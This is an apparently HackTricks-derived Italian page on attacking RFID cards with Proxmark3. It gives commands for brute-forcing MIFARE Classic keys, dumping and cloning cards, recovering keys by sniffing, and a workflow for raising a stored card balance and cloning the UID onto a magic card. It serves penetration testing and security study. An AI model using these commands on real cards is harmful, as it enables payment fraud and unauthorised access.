# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attaccare i sistemi RFID con Proxmark3

Installa il client Proxmark3 RRG/Iceman mantenuto attivamente e il firmware corrispondente, quindi verifica la sintassi dei comandi con quella build, perché i comandi meno recenti mostrati di seguito potrebbero essere cambiati.<sup>[[1]](#references)[[5]](#references)</sup>

### Attaccare MIFARE Classic 1KB

MIFARE Classic 1K ha **16 settori**, ciascuno con **4 blocchi** da **16 byte**. Il blocco 0 del produttore contiene l'UID e i dati del produttore ed è in sola lettura sulle schede NXP autentiche; le schede clone speciali o “magic” possono consentire di riscriverlo.<sup>[[1]](#references)[[2]](#references)</sup>\
Per accedere a ogni settore sono necessarie **2 chiavi** (**A** e **B**), memorizzate nel **blocco 3 di ogni settore** (sector trailer). Il sector trailer memorizza anche gli **access bits**, che definiscono i permessi di **lettura e scrittura** su **ogni blocco** utilizzando le 2 chiavi.\
2 chiavi sono utili per concedere i permessi di lettura se conosci la prima e di scrittura se conosci la seconda, ad esempio.

È possibile eseguire diversi attacchi
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 consente di eseguire altre azioni, come **intercettare** una **comunicazione Tag-to-Reader**, per cercare di trovare dati sensibili. In questa scheda puoi semplicemente sniffare la comunicazione e calcolare la chiave utilizzata, perché le **operazioni crittografiche utilizzate sono deboli** e, conoscendo il testo in chiaro e il testo cifrato, puoi calcolarla (strumento `mfkey64`).<sup>[[3]](#references)</sup>

#### Workflow rapido di MiFare Classic per l'abuso del valore memorizzato

Quando i terminali memorizzano i saldi sulle carte Classic, un tipico flusso end-to-end è il seguente:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Note

- `hf mf autopwn` orchestra attacchi in stile nested/darkside/HardNested, recupera le chiavi e crea dump nella cartella dei dump del client.<sup>[[1]](#references)</sup>
- La scrittura del blocco 0/UID funziona solo sulle card magic gen1a/gen2. Le card Classic normali hanno un UID di sola lettura.<sup>[[2]](#references)</sup>
- Molte implementazioni usano "value blocks" Classic o semplici checksum. Assicurati che tutti i campi duplicati/complementati e i checksum siano coerenti dopo la modifica.<sup>[[4]](#references)</sup>

Consulta una metodologia di livello superiore e le relative mitigazioni in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Comandi raw

I sistemi IoT a volte usano **tag senza marchio o non commerciali**. In questo caso, puoi usare Proxmark3 per inviare **comandi raw personalizzati ai tag**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quitting Search
```
Con queste informazioni puoi provare a cercare informazioni sulla card e sul modo di comunicare con essa. Proxmark3 consente di inviare comandi raw come: `hf 14a raw -p -b 7 26`

### Script

Il software Proxmark3 viene fornito con un elenco precaricato di **script di automazione** che puoi utilizzare per eseguire attività semplici. Per recuperare l’elenco completo, usa il comando `script list`. Successivamente, usa il comando `script run`, seguito dal nome dello script:
```
proxmark3> script run mfkeys
```
Puoi creare uno script per **fuzz tag readers**: quindi, dopo aver copiato i dati di una **carta valida**, è sufficiente scrivere uno **script Lua** che **randomize** uno o più **bytes** casuali e verificare se il **reader va in crash** durante una delle iterazioni.

## References

- [1] [Wiki di Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki di Proxmark3: carte HF Magic](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Dichiarazione di NXP su MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Exploitation della vulnerabilità delle carte NFC in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — installazione su Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
